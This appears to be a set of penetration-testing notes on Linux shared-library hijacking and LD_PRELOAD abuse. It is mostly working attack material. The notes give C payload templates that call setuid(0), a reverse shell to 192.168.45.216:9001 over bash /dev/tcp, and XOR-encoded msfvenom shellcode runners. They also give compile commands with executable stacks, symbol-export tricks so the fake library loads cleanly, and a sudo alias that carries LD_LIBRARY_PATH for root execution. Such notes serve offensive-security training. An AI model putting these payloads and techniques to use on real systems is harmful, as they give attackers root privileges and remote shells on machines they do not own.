
# Shared Libraries Hijacking

## Overview
Shared library hijacking in Linux is a form of attack that exploits the dynamic linking mechanism to load malicious code into a running application. Applications often depend on shared libraries (`.so` files) to provide functionality, but if an attacker can manipulate which libraries the application loads, they can execute arbitrary code with the same permissions as the application.

This attack is possible because the dynamic linker searches for shared libraries in specific locations, following a predefined order. By placing a malicious library in one of these locations, an attacker can "hijack" the loading process and inject their payload.

The attack can be successful if:

- The target application loads libraries from insecure directories (e.g., writable by users).
- The attacker can influence environment variables like `LD_LIBRARY_PATH`.
- The target application does not use full paths for libraries in its configuration.

There are several locations where Linux searches for shared libraries:
- Directories listed in the application's RPATH6 value.
- Directories specified in the LD_LIBRARY_PATH environment variable.
- Directories listed in the application's RUNPATH7 value.
- Directories specified in `/etc/ld.so.conf.8`
- System library directories: `/lib`, `/lib64`, `/usr/lib`, `/usr/lib64`, `/usr/local/lib`, `/usr/local/lib64`, and potentially others.

## Payloads

The following C payload demonstrates how shared library hijacking can be used to escalate privileges and execute arbitrary commands. The payload attempts to escalate privileges to root (`setuid(0)` and `setgid(0)`) and creates a file `/tmp/haxso.txt` as proof of concept.

```c
// Simple test payload
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void Warhead() __attribute__((constructor));
//Symbols go here

void Warhead() {
    setuid(0);
    setgid(0);
    printf("DLL HIJACKING IN PROGRESS \n");
    system("touch /tmp/haxso.txt");
}
```
Additionally, the template below can be used to obtain a reverse shell.
```c
// Reverse Shell
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void Warhead() __attribute__((constructor));
//Symbols go here

void Warhead() {
    setuid(0);
    setgid(0);
    printf("DLL HIJACKING IN PROGRESS \n");
    system("bash -c 'sh -i >& /dev/tcp/192.168.45.216/9001 0>&1'");
}
```
The below is an example of executing XOR encrypted shellcode within the template
```c
// msfvenom XOR shellcode runner
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void Warhead() __attribute__((constructor));

//Symbols go here

void Warhead() {
    setuid(0);
    setgid(0);
    printf("DLL HIJACKING IN PROGRESS \n");

// Output from encrypter.cs. Just ensure to remove the main function from the output before placing below
unsigned char Warhead[] = 
"\x99\x97\x24\x53\x5F\xC2\xF4\x83\xAE\x75\x8F\xE7\x26\x53\x5E\xF8"
"\xB6\x4F\x07\x48\x8D\x77\x37\xFF\xC6\x14\x31\x40\x5B\x52\x06\xB7"
"\xFF\x3E\x44\x07\x5A\x94\xE6\xFF\x93\x58\xAB\xFF\xFF\x8D\xA1\x3B"
"\xFA\x36\x38\xF2\x31\xA1\xE4\x9F\x0F\x1B\xEC\x46\x3A\xF2\x30\x9B"
"\x17\x53\xA6\x26\xEE\xD6\x2B\x5E\xA8\x77\x90\x5C\xBB\xE8\x65\x16"
"\xE3\x9F\x9B\x64\xFB\x88\x47\x91\xF0\xF9\xB7\x5E\x91\xEE\x19\x96"
"\x42\x41\x42\x4A\x34\x19\x98\xE5\xB7\x1E\x54\x31\x40\x4A\x35\x23"
"\x60\x29\x1E\x23\x56\xA1\x51\xE6\xAD\xCF\xE7\x26\x72\x42\xDD\x61"
"\x99\x27\x95\xDC\x8C\xF2\xFF\x94\x48\x8E\xCD\xE6\x94\x56\x60\xE7"
"\x2E\x92\xC5\x69\x47\x86\xDB\xBF\x28\x96\xC9\x20\x9E\xA9\x75\x3D"
"\x2C\xF5\x0A\x18\x45\x62\xAA\x28\x9A\xDF\x15\xFE\x0A\x15\x5E\x34"
"\xFF\x0A\x36\x47\xF4\xC5\x62\x40\x75\x6C\xF1\x6F\x1A\x57\xE8\x6F"
"\x18\x24\x57\xFA\xE7\xD9\x1D\x1F\x73\xB1\xA0\xB7\x32\xB5\xFE\x28"
"\x96\xF9\x07\xBF\x3A\x75\x35\x35\xA0\x65\x46\x57\xE8\x6F\x19\x3A"
"\x56\x92\x66\x14\x07\x48\x07\x8C\x38\x75\x1F\x07\xAA\x28\x96\xF8"
"\x25\x9E\x96\x10\x1A\x34\xF6\x3F\x57\x9A\xAD\xD6\xA7\x75\x23\x35"
"\xC5\x61\x40\x10\x68\xF1\x0A\x61\x45\x62\xAA\x28\x9A\xDF\x15\x42"
"\x9F\xF9\x72\x42\xBB\xE8\x5B\x52\x72";

    unsigned char launch_codes[5] = {0x72, 0xB0, 0x7F, 0x00, 0x00};
    int arraysize = (int) sizeof(Warhead);
    for (int i=0; i<arraysize-1; i++)
    {
        Warhead[i] = Warhead[i]^launch_codes[i % 5];
    }
    int (*ret)() = (int(*)())Warhead;
    ret();

}
```

### Identifying Target Application Dependencies

Once the malicious shared library is created, you need to identify which libraries the target application depends on. You can do this using `ldd`, which prints the shared libraries required by a given binary.

Example with `/usr/bin/top`:

```bash
ldd /usr/bin/top

linux-vdso.so.1 (0x00007ffebbfc3000)
libprocps.so.6 => /lib/x86_64-linux-gnu/libprocps.so.6 (0x00007f20bb6ce000)
libtinfo.so.5 => /lib/x86_64-linux-gnu/libtinfo.so.5 (0x00007f20bb4a4000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f20bb2a0000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f20baeaf000)
libsystemd.so.0 => /lib/x86_64-linux-gnu/libsystemd.so.0 (0x00007f20bac2b000)
/lib64/ld-linux-x86-64.so.2 (0x00007f20bbb34000)
librt.so.1 => /lib/x86_64-linux-gnu/librt.so.1 (0x00007f20baa23000)
liblzma.so.5 => /lib/x86_64-linux-gnu/liblzma.so.5 (0x00007f20ba7fd000)
liblz4.so.1 => /usr/lib/x86_64-linux-gnu/liblz4.so.1 (0x00007f20ba5e1000)
libgcrypt.so.20 => /lib/x86_64-linux-gnu/libgcrypt.so.20 (0x00007f20ba2c5000)
libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f20ba0a6000)
libgpg-error.so.0 => /lib/x86_64-linux-gnu/libgpg-error.so.0 (0x00007f20b9e91000)
```

### Hijacking a Shared Library

To exploit the application, you can replace one of its legitimate shared libraries with your malicious library. In the example below, we set the `LD_LIBRARY_PATH` environment variable to a custom directory (`/home/offsec/ldlib/`) and place the malicious library there:

```bash
export LD_LIBRARY_PATH=/home/offsec
cp libWarhead.so libgpg-error.so.0
```

This command makes the system load `libWarhead.so` in place of `libgpg-error.so.0`, triggering the execution of the attacker's payload.

### Extracting Symbols

Shared libraries need to export specific symbols that the application expects. If the malicious library does not export the correct symbols, the application might crash or fail to load it.

You can extract the necessary symbols from the original library using `readelf`:

```bash
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'
```
These then require placing into the template created earlier. Directly below the main constructor.
```c
// <-- Snip -->
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void Warhead() __attribute__((constructor));

int gpgrt_onclose;
int _gpgrt_putc_overflow;
int gpgrt_feof_unlocked;
int gpgrt_vbsprintf;
int gpgrt_ungetc;
// <-- Snip -->
```

This command will list the functions exported by `libgpg-error.so.0`.

### Creating a Symbols File (Optional)

Once you have identified the required symbols, you can create a symbol file for your malicious library. This ensures that your library exports the same symbols as the original, preventing crashes or errors when the application loads it.

```bash
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g'
```

Hereâ€™s an example of a symbol file for `libgpg-error.so.0`:

```
# save as gpg.map

GPG_ERROR_1.0 {
gpgrt_onclose;
_gpgrt_putc_overflow;
gpgrt_fflush;
gpgrt_poll;
};
```
### Compile the Payload

The payload can finally be compiled into a shared library. If performing simple command execution or a native reverse shell use the commands below.

```bash
gcc -Wall -fPIC -c -o payload.o payload.c
gcc -shared -o libWarhead.so payload.o (Optional: --version-script gpg.map)
```
However, if compiling for shell code execution we need to ensure the stack is made executable.
```bash
gcc -Wall -fPIC -c -o payload.o payload.c -z execstack
gcc -shared -o libWarhead.so payload.o -z execstack (Optional: --version-script gpg.map)
```

## Execution
Once the above steps are completed. Execution can be tested as the current user by simply running the targeted binary. Using the examples above we would then finally simply run.
```bash
top
```
This methodology can also be abused to run commands as root. Providing a binary can be started with Sudo.

```bash
alias sudo="sudo LD_LIBRARY_PATH=/home/offsec/"
source ~/.bashrc
sudo top
```

## Hunting for alternative binaries

```bash
for binary in /usr/bin/*; do ldd "$binary" 2>/dev/null | grep -q "libgpg-error.so.0" && echo "$binary"; done
```

# LD_Preload
```bash
# Overview of all function calls
ltrace -c cp | awk '{print $1}' | sort | uniq

# List function calls that take no arguments
ltrace -c cp | grep "(void)" | awk '{print $1}' | while read line; do echo -e "\e[31m$line\e[0m"; done
```

```c
// Standard shellcode runner
#define _GNU_SOURCE
#include <sys/mman.h> // for mprotect
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

char buf[] = 
"\xeb\x27\x5b\x53\x5f\xb0\x45\xfc\xae\x75\xfd\x57\x59\x53"
"\x5e\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f"
"\xb5\xf9\x74\x07\x80\x3e\x45\x75\xea\xeb\xe6\xff\xe1\xe8"
"\xd4\xff\xff\xff\x11\x45\xfa\x36\x4a\x42\x4e\xa1\x06\xed"
"\xbf\x64\xec\x46\x48\x42\x4f\x9b\x17\x21\x16\x59\xee\xd6"
"\x59\xee\xd7\x77\x90\x2e\x83\x2d\x65\x16\x91\x2f\x06\x64"
"\xfb\xfa\xf7\xee\xf0\xf9\xc5\xee\xee\xee\x19\x06\xf2\x3e"
"\x42\x4a\x46\xa9\x03\xe5\xb7\x6c\xe4\x4e\x40\x4a\x47\x93"
"\x1f\x29\x1e\x51\xe6\xde\x51\xe6\xdf\x7f\x98\x26\x93\xb7"
"\x6d\x1e\x99\x27\x03\x6c\xf3\xf2\xff\xe6\xf8\xf1\xcd\xe6"
"\xe6\xe6\x1f\x03\x2e\xe0\x75\x16\x47\x86\xa9\x0f\x57\x96"
"\xc9\x52\x2e\xd6\x75\x3d\x5e\x45\x75\x18\x45\x10\x1a\x57"
"\x9a\xdf\x67\x4e\x75\x15\x5e\x46\x4f\x75\x36\x47\x86\x75"
"\x1d\x40\x75\x1e\x41\x10\x1a\x57\x9a\xdf\x67\x24\x57\x88"
"\x57\xa6\x1d\x1f\x01\x01\xdf\xb7\x32\xc0\x4e\x57\x96\xf9"
"\x75\x0f\x45\x75\x35\x47\x10\x1a\x46\x57\x9a\xdf\x66\x3a"
"\x56\xe0\xd6\x6b\x07\x48\x75\x3c\x47\x75\x1f\x75\x1a\x57"
"\x96\xf8\x57\x2e\xe9\x10\x1a\x46\x46\x40\x57\x9a\xdf\x66"
"\xd8\x75\x23\x47\x75\x1e\x40\x10\x1a\x41\x75\x61\x45\x10"
"\x1a\x57\x9a\xdf\x67\xf2\xe0\xf9\x93\xb7\x83\x2d\xb5\xf9";



uid_t geteuid(void)
{ 
    typeof(geteuid) *old_geteuid;
    old_geteuid = dlsym(RTLD_NEXT, "geteuid");

           if (fork() == 0)
        {
                intptr_t pagesize = sysconf(_SC_PAGESIZE);
                if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)),
                 pagesize, PROT_READ|PROT_EXEC|PROT_WRITE)) {
                        perror("mprotect");
                        return -1;
                }
                int (*ret)() = (int(*)())buf;
                ret();
        }
        else
        {
                printf("HACK: returning from function...\n");
                return (*old_geteuid)();
        }
        printf("HACK: Returning from main...\n");
        return -2;
}
```
Compile code
```bash
gcc -Wall -fPIC -z execstack -c -o payload.o payload.c
gcc -shared -o payload.so payload.o -ldl
```
Export the library function
```bash
export LD_PRELOAD=/home/offsec/payload.so
```
Execute a binary that will excute our payload
```bash
cp /etc/passwd /tmp/testpasswd

# sudo
sudo cp /etc/passwd /tmp/testpasswd
```
Unset (When tidying up)
```bash
unset LD_PRELOAD
```
